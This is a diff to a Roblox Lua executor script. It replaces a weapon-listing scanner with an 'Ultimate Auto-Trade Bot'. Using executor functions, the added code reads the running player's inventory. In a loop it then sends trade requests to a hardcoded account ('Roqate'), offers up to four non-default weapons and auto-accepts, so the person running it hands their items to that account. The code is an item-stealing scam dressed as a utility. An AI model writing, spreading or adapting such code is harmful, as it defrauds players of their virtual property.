@@ -1,77 +1,125 @@
+-- Ultimate Auto-Trade Bot (Using PlayerData, Filters Default Items)
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
 
-local function setClipboard(txt)
-    if setclipboard then setclipboard(txt)
-    elseif toclipboard then toclipboard(txt)
-    else warn("Clipboard function not supported by this executor") end
-end
+-- Config
+local TARGET_PLAYER = "Roqate"
+local MAX_ITEMS_PER_TRADE = 4
+local TRADE_COOLDOWN = 5
+local ITEM_ADD_DELAY = 0.3
 
-local foundItems = {}
+-- Remotes
+local TradeRemotes = {
+    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
+    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
+    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
+}
 
--- Helper to safely read table keys/values
-local function scanTable(tbl)
-    for k, v in pairs(tbl) do
-        if typeof(k) == "string" then
-            table.insert(foundItems, k)
-        end
-        if typeof(v) == "string" then
-            table.insert(foundItems, v)
-        elseif typeof(v) == "table" then
-            scanTable(v)
+local isTrading = false
+local lastTradeTime = 0
+
+local function findPlayer(name)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name:lower() == name:lower() then
+            return player
         end
     end
+    return nil
 end
 
--- Recursively search any Instance for "Weapons"
-local function deepSearch(obj)
-    if obj.Name == "Weapons" then
-        print("Found Weapons at:", obj:GetFullName())
-        -- If it's a folder/model, collect child names
-        for _, child in ipairs(obj:GetChildren()) do
-            table.insert(foundItems, child.Name)
-        end
-        -- If it's a value container, try reading it
-        pcall(function()
-            if typeof(obj) == "Instance" and obj.ClassName:find("Value") and typeof(obj.Value) == "table" then
-                scanTable(obj.Value)
+local function isTradeGUIOpen()
+    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
+end
+
+-- Get weapons directly from PlayerData
+local function getAllWeaponsFromPlayerData()
+    local weapons = {}
+    local playerData = getrenv()._G.PlayerData and getrenv()._G.PlayerData[LocalPlayer.Name]
+    
+    if playerData and playerData.Inventory and playerData.Inventory.Weapons then
+        for weaponName, _ in pairs(playerData.Inventory.Weapons) do
+            if weaponName ~= "Default Knife" and weaponName ~= "Default Gun" then
+                table.insert(weapons, weaponName)
+                if #weapons >= MAX_ITEMS_PER_TRADE then
+                    break
+                end
             end
-        end)
+        end
     end
-    -- Keep searching deeper
-    for _, child in ipairs(obj:GetChildren()) do
-        deepSearch(child)
+    
+    return weapons
+end
+
+local function addWeaponsToTrade()
+    local weapons = getAllWeaponsFromPlayerData()
+    if #weapons == 0 then
+        warn("No valid weapons found in PlayerData!")
+        return false
     end
-end
 
--- Scan all children of the player
-deepSearch(player)
-
--- Also scan Player scripts/tables
-for _, child in pairs(getgc(true)) do
-    -- Some games store inventory in tables in memory
-    if type(child) == "table" and rawget(child, "Weapons") then
-        print("Found Weapons table in GC!")
-        scanTable(child.Weapons)
+    for i = 1, math.min(#weapons, MAX_ITEMS_PER_TRADE) do
+        TradeRemotes.OfferItem:FireServer(weapons[i], "Weapons")
+        task.wait(ITEM_ADD_DELAY)
     end
+    
+    return true
 end
 
--- Remove duplicates
-local unique = {}
-for _, v in ipairs(foundItems) do
-    unique[v] = true
+local function acceptTrade()
+    if not isTradeGUIOpen() then
+        warn("Trade GUI not open!")
+        return false
+    end
+    TradeRemotes.AcceptTrade:FireServer(285646582)
+    return true
 end
-local finalList = {}
-for k in pairs(unique) do
-    table.insert(finalList, k)
-end
-table.sort(finalList)
 
--- Output + copy
-if #finalList > 0 then
-    local text = table.concat(finalList, "\n")
-    print("Weapons Found:\n" .. text)
-    setClipboard(text)
-else
-    warn("No weapons found!")
+local function initiateTrade(targetPlayer)
+    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then return end
+    
+    isTrading = true
+    print("Starting trade with " .. targetPlayer.Name .. "...")
+    
+    local success, err = pcall(function()
+        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
+    end)
+    
+    if not success then
+        warn("Trade request failed: " .. err)
+        isTrading = false
+        return
+    end
+    
+    task.wait(1)
+    
+    if not isTradeGUIOpen() then
+        warn("Trade GUI didn't open!")
+        isTrading = false
+        return
+    end
+    
+    if not addWeaponsToTrade() then
+        isTrading = false
+        return
+    end
+    
+    if not acceptTrade() then
+        warn("Failed to accept trade!")
+    else
+        print("Trade with " .. targetPlayer.Name .. " completed!")
+    end
+    
+    isTrading = false
+    lastTradeTime = os.time()
+end
+
+while true do
+    local target = findPlayer(TARGET_PLAYER)
+    if target then
+        initiateTrade(target)
+    else
+        print(TARGET_PLAYER .. " not found. Waiting...")
+    end
+    task.wait(5)
 end
